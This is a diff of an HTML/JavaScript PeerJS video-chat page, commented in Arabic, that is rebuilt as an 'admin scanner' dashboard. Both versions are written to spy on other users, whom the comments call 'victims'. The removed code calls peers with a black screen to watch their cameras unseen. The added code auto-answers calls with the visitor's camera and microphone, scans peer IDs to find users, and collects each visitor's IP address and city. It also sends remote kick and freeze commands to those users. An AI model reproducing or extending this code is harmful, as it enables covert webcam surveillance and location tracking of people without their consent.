@@ -3,132 +3,144 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Real Server Chat | Firebase</title>
-    
-    <!-- مكتبات PeerJS و Firebase -->
+    <title>Server Control Dashboard</title>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
-        body { background: #050505; color: #0f0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        * { box-sizing: border-box; font-family: 'Segoe UI', monospace; margin: 0; padding: 0; }
+        body { background: #0b0b0b; color: #00ff00; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
 
-        /* الشاشة الرئيسية */
-        #mainInterface { display: flex; height: 100%; flex-direction: column; }
-        .video-container { flex: 1; display: flex; border-bottom: 2px solid #0f0; position: relative; }
-        .vid-box { flex: 1; border-right: 1px solid #0f0; position: relative; background: #000; }
-        video { width: 100%; height: 100%; object-fit: cover; }
-        .label { position: absolute; bottom: 10px; left: 10px; background: rgba(0,0,0,0.8); padding: 5px; color: white; border-radius: 5px; }
-
-        /* زر الأدمن */
-        #adminBtn {
-            position: fixed; top: 10px; right: 10px; z-index: 9999;
-            background: #b00; color: white; border: 2px solid red; padding: 10px 20px;
-            font-weight: bold; cursor: pointer; border-radius: 5px;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0.7); } 70% { box-shadow: 0 0 0 10px rgba(255, 0, 0, 0); } 100% { box-shadow: 0 0 0 0 rgba(255, 0, 0, 0); } }
-
-        /* لوحة التحكم */
-        #adminPanel {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95); z-index: 10000;
-            display: none; flex-direction: column; padding: 20px;
-        }
-        
-        .panel-header { display: flex; justify-content: space-between; border-bottom: 1px solid red; padding-bottom: 10px; margin-bottom: 20px; }
-        
-        .online-list {
-            flex: 1; overflow-y: auto; border: 1px solid #333; padding: 10px; background: #111;
-        }
-
-        .user-row {
+        /* الشريط العلوي */
+        .server-header {
+            background: #111; border-bottom: 2px solid #00ff00; padding: 15px;
             display: flex; justify-content: space-between; align-items: center;
-            background: #222; margin-bottom: 5px; padding: 10px; border-left: 3px solid #0f0;
+            box-shadow: 0 5px 15px rgba(0, 255, 0, 0.1);
         }
-        .user-row span { color: white; font-size: 1.1rem; }
+        .status-box { font-size: 0.9rem; color: #888; }
+        .active-count { color: #fff; font-weight: bold; font-size: 1.2rem; }
+
+        /* المنطقة الرئيسية */
+        .main-container { display: flex; flex: 1; height: 100%; }
+
+        /* القائمة الجانبية (السيرفر) */
+        .sidebar {
+            width: 350px; background: #080808; border-left: 1px solid #333;
+            display: flex; flex-direction: column; padding: 10px;
+            overflow-y: auto;
+        }
+
+        .user-card {
+            background: #1a1a1a; border: 1px solid #333; padding: 10px; margin-bottom: 8px;
+            border-radius: 5px; transition: 0.3s; position: relative;
+        }
+        .user-card:hover { border-color: #00ff00; background: #222; }
+        .user-card.active { border-color: #00ff00; box-shadow: 0 0 10px rgba(0,255,0,0.2); }
         
-        .btn-action { padding: 5px 10px; cursor: pointer; border: none; font-weight: bold; margin-left: 5px; }
-        .btn-spy { background: #330; color: yellow; }
-        .btn-kick { background: #500; color: white; }
-        .btn-call { background: #005; color: white; }
+        .user-info { font-size: 0.8rem; color: #ccc; margin-bottom: 5px; }
+        .user-info span { color: #00ff00; font-weight: bold; }
+        
+        .action-btns { display: flex; gap: 5px; margin-top: 5px; }
+        .btn-mini {
+            flex: 1; padding: 5px; border: none; cursor: pointer; font-size: 0.7rem; font-weight: bold; color: white;
+        }
+        .btn-kick { background: #800; }
+        .btn-freeze { background: #008; }
+        .btn-spy { background: #880; color: black; }
+
+        /* منطقة الفيديو */
+        .video-area { flex: 1; position: relative; background: black; display: flex; justify-content: center; align-items: center; }
+        video { width: 100%; height: 100%; object-fit: cover; }
+        .overlay-label { position: absolute; bottom: 20px; left: 20px; background: rgba(0,0,0,0.7); padding: 5px 10px; color: white; border-radius: 4px; }
+
+        /* شاشة الدخول */
+        #loginOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #000; z-index: 9999; display: flex; flex-direction: column;
+            align-items: center; justify-content: center;
+        }
+        .login-box { border: 2px solid #00ff00; padding: 40px; text-align: center; border-radius: 10px; width: 90%; max-width: 400px; }
+        .login-box input { width: 100%; padding: 10px; margin: 10px 0; background: #111; border: 1px solid #555; color: white; text-align: center; }
+        .login-box button { width: 100%; padding: 10px; background: #004400; color: #00ff00; border: 1px solid #00ff00; cursor: pointer; font-weight: bold; }
 
         /* تأثيرات الضحية */
-        body.hacked { filter: invert(1); }
-        body.frozen { pointer-events: none; opacity: 0.5; }
-
-        /* معلوماتي */
-        #myStatus { position: absolute; top: 10px; left: 10px; color: #777; z-index: 5; background: black; padding: 5px; }
+        body.frozen { pointer-events: none; opacity: 0.3; background: white; }
     </style>
 </head>
 <body>
 
-    <div id="myStatus">My ID: <span id="myIdDisplay" style="color:white">...</span> | Status: <span id="connStatus" style="color:red">Offline</span></div>
-
-    <!-- زر فتح اللوحة -->
-    <button id="adminBtn" onclick="togglePanel()">👑 SERVER ADMIN</button>
-
-    <!-- لوحة التحكم الحقيقية -->
-    <div id="adminPanel">
-        <div class="panel-header">
-            <h2 style="color:red;">🔥 REAL-TIME SERVER CONTROL</h2>
-            <button onclick="togglePanel()" style="background:white; border:none; padding:5px 20px; cursor:pointer;">CLOSE X</button>
-        </div>
-
-        <h3 style="color:#0f0; margin-bottom:10px;">🟢 ONLINE USERS (LIVE)</h3>
-        <div class="online-list" id="usersList">
-            <div style="text-align:center; color:#555; margin-top:20px;">جاري الاتصال بالسيرفر...</div>
+    <!-- شاشة الدخول -->
+    <div id="loginOverlay">
+        <div class="login-box">
+            <h2 style="margin-bottom:20px; color:#00ff00;">SERVER ACCESS</h2>
+            <p style="color:#777; font-size:0.8rem;">YOUR ID (AUTO):</p>
+            <h1 id="myIdDisplay" style="color:white; margin-bottom:20px;">...</h1>
+            
+            <div style="border-top:1px dashed #333; margin:20px 0; padding-top:20px;">
+                <p style="color:yellow; font-size:0.9rem;">Choose Mode:</p>
+                <button onclick="startUserMode()">👤 ENTER AS USER</button>
+                <br><br>
+                <button onclick="startAdminMode()" style="background:#400; border-color:red; color:white;">👑 ENTER AS ADMIN (SCANNER)</button>
+            </div>
         </div>
     </div>
 
-    <!-- واجهة الفيديو -->
-    <div id="mainInterface">
-        <div class="video-container">
-            <div class="vid-box">
+    <!-- لوحة التحكم -->
+    <div class="server-header">
+        <div>
+            <span style="font-weight:bold; font-size:1.2rem;">⚡ CONTROL DASHBOARD</span>
+            <span id="scanStatus" style="margin-right:20px; font-size:0.8rem; color:yellow; display:none;">SCANNING NETWORK...</span>
+        </div>
+        <div class="status-box">
+            Connected Users: <span class="active-count" id="userCount">0</span>
+        </div>
+    </div>
+
+    <div class="main-container">
+        <!-- الفيديو -->
+        <div class="video-area">
+            <video id="remoteVideo" autoplay></video>
+            <div class="overlay-label" id="videoLabel">WAITING FOR CONNECTION...</div>
+            
+            <!-- فيديوي أنا (صغير) -->
+            <div style="position:absolute; bottom:20px; right:20px; width:150px; height:100px; border:1px solid #333; background:#000;">
                 <video id="localVideo" autoplay muted></video>
-                <div class="label">ME</div>
             </div>
-            <div class="vid-box">
-                <video id="remoteVideo" autoplay></video>
-                <div class="label">TARGET</div>
+        </div>
+
+        <!-- قائمة المتصلين (لأدمن فقط) -->
+        <div class="sidebar" id="adminSidebar" style="display:none;">
+            <h3 style="border-bottom:1px solid #333; padding-bottom:10px; margin-bottom:10px;">📡 DETECTED USERS</h3>
+            <div id="usersList">
+                <!-- سيتم ملء المستخدمين هنا -->
             </div>
         </div>
     </div>
 
     <script>
-        // =======================================================
-        // 1. إعدادات السيرفر (FIREBASE CONFIG) - ضع إعداداتك هنا
-        // =======================================================
-        const firebaseConfig = {
-            apiKey: "ضع_API_KEY_هنا",
-            authDomain: "YOUR_PROJECT.firebaseapp.com",
-            databaseURL: "https://YOUR_PROJECT-default-rtdb.firebaseio.com",
-            projectId: "YOUR_PROJECT",
-            storageBucket: "YOUR_PROJECT.appspot.com",
-            messagingSenderId: "123456789",
-            appId: "1:123456789:web:xxxxxx"
-        };
-        // ملاحظة: إذا لم تضع الإعدادات أعلاه، لن تعمل القائمة الحقيقية.
-
-        // تهيئة Firebase
-        try {
-            firebase.initializeApp(firebaseConfig);
-            var db = firebase.database();
-            console.log("Firebase Connected");
-        } catch(e) {
-            console.error("Firebase Error: تأكد من وضع الإعدادات الصحيحة", e);
-            alert("تنبيه: لم يتم ربط السيرفر. القائمة لن تعمل حتى تضع إعدادات Firebase في الكود.");
-        }
-
-        // =======================================================
-        // 2. إعدادات الاتصال (PeerJS)
-        // =======================================================
-        const myId = Math.floor(100000 + Math.random() * 900000).toString(); // رقم عشوائي طويل
+        // === 1. تحديد الهوية ===
+        // نستخدم أرقام صغيرة (10-99) لتسهيل العثور على الناس في هذا المثال
+        const myId = Math.floor(Math.random() * (99 - 10 + 1) + 10).toString();
         document.getElementById('myIdDisplay').innerText = myId;
 
         let peer = new Peer(myId);
         let conn, call, localStream;
+        let detectedUsers = {}; // تخزين بيانات المستخدمين الحقيقية
+        let isAdmin = false;
+
+        // === 2. جلب المعلومات الحقيقية (IP/Country) ===
+        let myInfo = {
+            id: myId,
+            ip: 'Loading...',
+            country: 'Unknown',
+            device: navigator.platform
+        };
+
+        fetch('https://ipapi.co/json/')
+            .then(res => res.json())
+            .then(data => {
+                myInfo.ip = data.ip;
+                myInfo.country = data.country_name;
+                myInfo.city = data.city;
+            }).catch(err => console.log("Adblocker blocked IP API"));
 
         // تشغيل الكاميرا
         navigator.mediaDevices.getUserMedia({video:true, audio:true}).then(stream => {
@@ -136,142 +148,182 @@
             document.getElementById('localVideo').srcObject = stream;
         });
 
-        peer.on('open', id => {
-            document.getElementById('connStatus').innerText = "Online ✅";
-            document.getElementById('connStatus').style.color = "#0f0";
-            
-            // 🔥 إضافة نفسي للسيرفر الحقيقي 🔥
-            if(typeof db !== 'undefined') {
-                const userRef = db.ref('online_users/' + id);
-                userRef.set({
-                    id: id,
-                    device: navigator.platform,
-                    time: Date.now()
-                });
-                // حذف نفسي عند الخروج تلقائياً
-                userRef.onDisconnect().remove();
-            }
-        });
+        // === 3. التعامل مع PeerJS ===
+        peer.on('open', id => console.log('My ID:', id));
 
-        // استقبال الاتصال
+        // استقبال اتصال (وضع الضحية)
         peer.on('connection', c => {
             conn = c;
-            setupData();
+            // إذا كنت مستخدماً عادياً، أرسل بياناتي للأدمن فوراً
+            if(!isAdmin) {
+                conn.on('open', () => {
+                    conn.send({ type: 'MY_INFO', data: myInfo });
+                });
+                setupDataListener();
+            } else {
+                // إذا كنت أدمن واتصل بي أحد
+                handleAdminConnection(c);
+            }
         });
 
         peer.on('call', incoming => {
             incoming.answer(localStream);
             call = incoming;
             call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
+            document.getElementById('videoLabel').innerText = "CONNECTED WITH: " + incoming.peer;
         });
 
-        // =======================================================
-        // 3. لوحة الأدمن (مراقبة السيرفر)
-        // =======================================================
+        // === 4. وظائف الأدمن (السيرفر) ===
+        function startAdminMode() {
+            isAdmin = true;
+            document.getElementById('loginOverlay').style.display = 'none';
+            document.getElementById('adminSidebar').style.display = 'flex';
+            document.getElementById('scanStatus').style.display = 'inline';
+            
+            // بدء المسح التلقائي
+            startServerScanner();
+        }
+
+        function startUserMode() {
+            isAdmin = false;
+            document.getElementById('loginOverlay').style.display = 'none';
+            // المستخدم العادي لا يرى القائمة الجانبية
+        }
+
+        // === 5. الرادار (SCANNER BOT) ===
+        // هذا الكود هو "السيرفر" الذي يبحث عن المتصلين
+        let scanIndex = 10;
         
-        // الاستماع لقاعدة البيانات الحقيقية
-        if(typeof db !== 'undefined') {
-            db.ref('online_users').on('value', snapshot => {
-                const users = snapshot.val();
-                renderOnlineList(users);
+        function startServerScanner() {
+            setInterval(() => {
+                // نوقف المسح إذا كنا متصلين بشخص حالياً
+                if(conn && conn.open) return;
+
+                if(scanIndex > 99) scanIndex = 10; // إعادة الدورة
+                let target = scanIndex.toString();
+
+                if(target !== myId && !detectedUsers[target]) {
+                    checkUser(target);
+                }
+                scanIndex++;
+            }, 500); // سرعة المسح (كل نصف ثانية يجرب رقم)
+        }
+
+        function checkUser(targetId) {
+            // محاولة اتصال خفيفة
+            let checkConn = peer.connect(targetId);
+            
+            checkConn.on('open', () => {
+                // وجدنا مستخدم! نطلب بياناته
+                // لا نضيفه للقائمة فوراً، ننتظر أن يرسل بياناته
+                checkConn.send("PING");
+            });
+
+            checkConn.on('data', data => {
+                if(data.type === 'MY_INFO') {
+                    // استلمنا بيانات حقيقية!
+                    addUserToDashboard(data.data);
+                    checkConn.close(); // نغلق الاتصال الخفيف لنكمل المسح
+                }
+            });
+
+            // إغلاق الاتصال إذا لم يرد
+            setTimeout(() => { if(checkConn.open) checkConn.close(); }, 2000);
+        }
+
+        function handleAdminConnection(c) {
+            c.on('data', data => {
+                if(data.type === 'MY_INFO') {
+                    addUserToDashboard(data.data);
+                }
             });
         }
 
-        function renderOnlineList(users) {
-            const listDiv = document.getElementById('usersList');
-            listDiv.innerHTML = '';
+        // === 6. عرض البيانات في اللوحة ===
+        function addUserToDashboard(userInfo) {
+            if(detectedUsers[userInfo.id]) return; // موجود مسبقاً
 
-            if(!users) {
-                listDiv.innerHTML = '<div style="text-align:center; color:#555;">لا يوجد أحد أونلاين سواك.</div>';
-                return;
-            }
+            detectedUsers[userInfo.id] = userInfo;
+            updateUserCount();
 
-            Object.keys(users).forEach(userId => {
-                if(userId === myId) return; // لا تظهر نفسي
-
-                const user = users[userId];
-                const row = `
-                    <div class="user-row">
-                        <div>
-                            <span style="font-weight:bold; color:#0f0;">ID: ${user.id}</span>
-                            <br><span style="font-size:0.8rem; color:#777;">Device: ${user.device}</span>
-                        </div>
-                        <div>
-                            <button class="btn-action btn-spy" onclick="spyOn('${user.id}')">👁️ تجسس</button>
-                            <button class="btn-action btn-call" onclick="connectTo('${user.id}')">📞 اتصال</button>
-                            <button class="btn-action btn-kick" onclick="kickUser('${user.id}')">🚫 طرد</button>
-                        </div>
-                    </div>
-                `;
-                listDiv.innerHTML += row;
-            });
+            let sidebar = document.getElementById('usersList');
+            let card = document.createElement('div');
+            card.className = 'user-card';
+            card.id = 'user-' + userInfo.id;
+            card.innerHTML = `
+                <div class="user-info">ID: <span>${userInfo.id}</span></div>
+                <div class="user-info">IP: ${userInfo.ip}</div>
+                <div class="user-info">Loc: ${userInfo.country}</div>
+                <div class="user-info">Dev: ${userInfo.device}</div>
+                <div class="action-btns">
+                    <button class="btn-mini btn-kick" onclick="sendCommand('${userInfo.id}', 'KICK')">KICK</button>
+                    <button class="btn-mini btn-freeze" onclick="sendCommand('${userInfo.id}', 'FREEZE')">FREEZE</button>
+                    <button class="btn-mini btn-spy" onclick="connectToUser('${userInfo.id}')">CONNECT</button>
+                </div>
+            `;
+            sidebar.prepend(card);
         }
 
-        function togglePanel() {
-            const p = document.getElementById('adminPanel');
-            p.style.display = (p.style.display === 'flex') ? 'none' : 'flex';
+        function updateUserCount() {
+            document.getElementById('userCount').innerText = Object.keys(detectedUsers).length;
         }
 
-        // =======================================================
-        // 4. وظائف التحكم (Spy, Call, Kick)
-        // =======================================================
-
-        function connectTo(id) {
+        // === 7. الاتصال والتحكم ===
+        function connectToUser(id) {
             conn = peer.connect(id);
             conn.on('open', () => {
                 call = peer.call(id, localStream);
-                call.on('stream', rs => document.getElementById('remoteVideo').srcObject = rs);
-                setupData();
-                togglePanel();
+                call.on('stream', rs => {
+                    document.getElementById('remoteVideo').srcObject = rs;
+                    document.getElementById('videoLabel').innerText = "LIVE: " + id;
+                });
+                
+                // تظليل المستخدم النشط
+                document.querySelectorAll('.user-card').forEach(c => c.classList.remove('active'));
+                document.getElementById('user-' + id).classList.add('active');
             });
         }
 
-        function spyOn(id) {
-            // إنشاء شاشة سوداء
-            const canvas = document.createElement('canvas');
-            canvas.width=100; canvas.height=100;
-            const ctx = canvas.getContext('2d'); ctx.fillStyle="black"; ctx.fillRect(0,0,100,100);
-            const blackStream = canvas.captureStream(30);
-            // إضافة صوت صامت
-            const ac = new AudioContext(); const dest = ac.createMediaStreamDestination();
-            blackStream.addTrack(dest.stream.getAudioTracks()[0]);
-
-            call = peer.call(id, blackStream);
-            call.on('stream', rs => {
-                document.getElementById('remoteVideo').srcObject = rs; // أرى الضحية
-                document.getElementById('localVideo').srcObject = blackStream; // شاشتي سوداء
-                togglePanel();
-            });
-            // نفتح قناة بيانات أيضاً لإرسال الأوامر
-            conn = peer.connect(id);
-        }
-
-        function kickUser(id) {
-            // نتصل به فقط لطرده
-            const tempConn = peer.connect(id);
-            tempConn.on('open', () => {
-                tempConn.send({type: 'CMD', action: 'KICK'});
-                setTimeout(() => tempConn.close(), 500);
-                alert("تم إرسال أمر الطرد إلى: " + id);
+        function sendCommand(id, action) {
+            // يجب الاتصال سريعاً لإرسال الأمر ثم الخروج
+            let cmdConn = peer.connect(id);
+            cmdConn.on('open', () => {
+                cmdConn.send({ type: 'CMD', action: action });
+                setTimeout(() => cmdConn.close(), 500);
+                alert(`Command ${action} sent to ${id}`);
+                
+                if(action === 'KICK') {
+                    // إزالة من القائمة
+                    delete detectedUsers[id];
+                    let el = document.getElementById('user-' + id);
+                    if(el) el.remove();
+                    updateUserCount();
+                }
             });
         }
 
-        // =======================================================
-        // 5. استقبال الأوامر (جانب الضحية)
-        // =======================================================
-        function setupData() {
+        // === 8. استقبال الأوامر (جانب المستخدم) ===
+        function setupDataListener() {
             conn.on('data', data => {
-                if(data.type === 'CMD') executeCmd(data.action);
+                if(data === "PING") {
+                    // السيرفر يتحقق مني، أرسل بياناتي
+                    conn.send({ type: 'MY_INFO', data: myInfo });
+                }
+                if(data.type === 'CMD') {
+                    executeCommand(data.action);
+                }
             });
         }
 
-        function executeCmd(action) {
+        function executeCommand(action) {
             if(action === 'KICK') {
-                document.body.innerHTML = '<h1 style="color:red; text-align:center; margin-top:20%;">تم طردك من السيرفر!</h1>';
+                document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20%'>YOU HAVE BEEN KICKED BY SERVER</h1>";
                 setTimeout(() => location.reload(), 2000);
             }
-            if(action === 'FREEZE') document.body.classList.add('frozen');
-            if(action === 'HACK') document.body.classList.add('hacked');
+            if(action === 'FREEZE') {
+                document.body.classList.add('frozen');
+                alert("SYSTEM FREEZE INITIATED");
+            }
         }
 
     </script>
